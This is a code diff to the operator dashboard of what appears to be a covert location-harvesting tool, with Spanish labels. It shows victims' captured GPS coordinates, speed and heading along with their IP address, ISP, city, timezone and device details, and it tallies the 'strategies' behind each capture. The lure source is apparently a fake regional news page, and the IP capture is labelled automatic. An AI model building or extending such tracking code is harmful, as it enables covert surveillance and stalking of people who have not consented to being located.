@@ -433,25 +433,69 @@
                     return;
                 }
                 
-                container.innerHTML = uniqueLocations.map(location => `
-                    <div class="location-item">
-                        <div class="location-header">🎯 ${location.source}</div>
-                        <div class="location-details">
-                            📍 <strong>Coordenadas:</strong> ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}<br>
-                            🎯 <strong>Precisión:</strong> ±${Math.round(location.accuracy || 0)}m<br>
-                            ⏰ <strong>Capturado:</strong> ${new Date(location.timestamp).toLocaleString()}<br>
-                            🌐 <strong>Dispositivo:</strong> ${(location.userAgent && location.userAgent.includes('Mobile')) ? '📱 Móvil' : '💻 PC'}
-                            <div style="margin-top: 10px;">
-                                <button onclick="openInGoogleMaps(${location.lat}, ${location.lng})" style="background: #3498db; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin-right: 5px; font-size: 0.8rem;">
-                                    🗺️ Ver en Mapa
-                                </button>
-                                <button onclick="copyToClipboard('${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}')" style="background: #27ae60; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-size: 0.8rem;">
-                                    📋 Copiar Coordenadas
-                                </button>
+                container.innerHTML = uniqueLocations.map(location => {
+                    // Determinar tipo de captura y color
+                    const isGPS = location.method === 'GPS_PRECISE';
+                    const isIP = location.method === 'IP_AUTOMATIC';
+                    const methodColor = isGPS ? '#27ae60' : '#f39c12';
+                    const methodIcon = isGPS ? '🎯' : '🌐';
+                    const methodText = isGPS ? 'GPS Exacto' : 'Ubicación IP';
+                    
+                    // Formatear precisión
+                    let precisionText = 'N/A';
+                    if (isGPS && location.accuracy) {
+                        precisionText = `±${Math.round(parseFloat(location.accuracy) || 0)}m`;
+                    } else if (isIP) {
+                        precisionText = location.accuracy || 'Ciudad/Región (~5-50km)';
+                    }
+                    
+                    // Información adicional
+                    let additionalInfo = '';
+                    if (isIP) {
+                        additionalInfo = `
+                            🏙️ <strong>Ciudad:</strong> ${location.city || 'N/A'}<br>
+                            🗺️ <strong>Región:</strong> ${location.region || 'N/A'}<br>
+                            🌍 <strong>País:</strong> ${location.country || 'N/A'}<br>
+                            🌐 <strong>IP:</strong> ${location.ip || 'N/A'}<br>
+                            📡 <strong>ISP:</strong> ${location.isp || 'N/A'}<br>
+                            🕒 <strong>Zona Horaria:</strong> ${location.timezone || 'N/A'}<br>
+                            🗣️ <strong>Idioma:</strong> ${location.language || 'N/A'}<br>
+                            📱 <strong>Pantalla:</strong> ${location.screenRes || 'N/A'}<br>
+                        `;
+                    } else if (isGPS) {
+                        additionalInfo = `
+                            ⛰️ <strong>Altitud:</strong> ${location.altitude || 'N/A'}<br>
+                            🧭 <strong>Dirección:</strong> ${location.heading || 'N/A'}<br>
+                            🏃 <strong>Velocidad:</strong> ${location.speed || 'N/A'}<br>
+                            🤖 <strong>Método:</strong> ${location.captureMethod || 'N/A'}<br>
+                            📱 <strong>Pantalla:</strong> ${location.screenRes || 'N/A'}<br>
+                        `;
+                    }
+                    
+                    return `
+                        <div class="location-item" style="border-left: 4px solid ${methodColor};">
+                            <div class="location-header">
+                                <span style="color: ${methodColor};">${methodIcon} ${methodText}</span>
+                                <span style="font-size: 0.8rem; color: #95a5a6; float: right;">${location.source || 'Diario Regional'}</span>
+                            </div>
+                            <div class="location-details">
+                                📍 <strong>Coordenadas:</strong> ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}<br>
+                                🎯 <strong>Precisión:</strong> ${precisionText}<br>
+                                ⏰ <strong>Capturado:</strong> ${new Date(location.timestamp).toLocaleString()}<br>
+                                🌐 <strong>Dispositivo:</strong> ${(location.userAgent && location.userAgent.includes('Mobile')) ? '📱 Móvil' : '💻 PC'}<br>
+                                ${additionalInfo}
+                                <div style="margin-top: 15px; padding-top: 10px; border-top: 1px solid #34495e;">
+                                    <button onclick="openInGoogleMaps(${location.lat}, ${location.lng})" style="background: #3498db; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; margin-right: 8px; font-size: 0.85rem;">
+                                        🗺️ Ver en Mapa
+                                    </button>
+                                    <button onclick="copyToClipboard('${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}')" style="background: #27ae60; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-size: 0.85rem;">
+                                        📋 Copiar Coordenadas
+                                    </button>
+                                </div>
                             </div>
                         </div>
-                    </div>
-                `).join('');
+                    `;
+                }).join('');
                 
                 // Actualizar estadísticas con datos combinados
                 updateStatsWithSharedData(uniqueLocations);
@@ -497,39 +541,47 @@
             }
         }
         
-        // Actualizar estadísticas con datos compartidos
+        // Actualizar estadísticas con datos compartidos (IP + GPS)
         function updateStatsWithSharedData(locations) {
-            // Total capturas
-            document.getElementById('totalCaptures').textContent = locations.length;
+            // Separar por tipo de captura
+            const gpsCaptures = locations.filter(loc => loc.method === 'GPS_PRECISE');
+            const ipCaptures = locations.filter(loc => loc.method === 'IP_AUTOMATIC');
             
-            // Capturas hoy
+            // Total capturas con desglose
+            const totalText = `${locations.length} (🌐 ${ipCaptures.length} IP + 🎯 ${gpsCaptures.length} GPS)`;
+            document.getElementById('totalCaptures').textContent = totalText;
+            
+            // Capturas hoy con desglose
             const today = new Date().toDateString();
-            const todayCaptures = locations.filter(loc => 
+            const todayGPS = gpsCaptures.filter(loc => 
                 new Date(loc.timestamp).toDateString() === today
             ).length;
-            document.getElementById('todayCaptures').textContent = todayCaptures;
+            const todayIP = ipCaptures.filter(loc => 
+                new Date(loc.timestamp).toDateString() === today
+            ).length;
+            const todayText = `${todayGPS + todayIP} (🌐 ${todayIP} IP + 🎯 ${todayGPS} GPS)`;
+            document.getElementById('todayCaptures').textContent = todayText;
             
-            // Precisión promedio
-            if (locations.length > 0) {
-                const avgAccuracy = locations.reduce((sum, loc) => sum + (loc.accuracy || 0), 0) / locations.length;
-                document.getElementById('averageAccuracy').textContent = Math.round(avgAccuracy) + 'm';
+            // Precisión promedio (solo para GPS)
+            if (gpsCaptures.length > 0) {
+                const avgAccuracy = gpsCaptures.reduce((sum, loc) => {
+                    const acc = parseFloat(loc.accuracy) || 0;
+                    return sum + acc;
+                }, 0) / gpsCaptures.length;
+                const precisionText = `${Math.round(avgAccuracy)}m GPS (${gpsCaptures.length} muestras)`;
+                document.getElementById('averageAccuracy').textContent = precisionText;
+            } else {
+                document.getElementById('averageAccuracy').textContent = 'Solo capturas IP (ciudad)';
             }
             
-            // Mejor estrategia
-            const strategies = {};
-            locations.forEach(loc => {
-                strategies[loc.source] = (strategies[loc.source] || 0) + 1;
-            });
+            // Estrategia híbrida
+            const strategyText = ipCaptures.length > 0 && gpsCaptures.length > 0 
+                ? '🚀 Híbrida (IP + GPS)' 
+                : ipCaptures.length > 0 
+                    ? '🌐 Solo IP Automática'
+                    : '🎯 Solo GPS Manual';
             
-            const bestStrategy = Object.keys(strategies).reduce((a, b) => 
-                strategies[a] > strategies[b] ? a : b, '-'
-            );
-            
-            const shortName = {
-                'Diario Regional - Noticias': '📰 Noticias'
-            };
-            
-            document.getElementById('bestStrategy').textContent = shortName[bestStrategy] || bestStrategy;
+            document.getElementById('bestStrategy').textContent = strategyText;
         }
         
         // Abrir en Google Maps
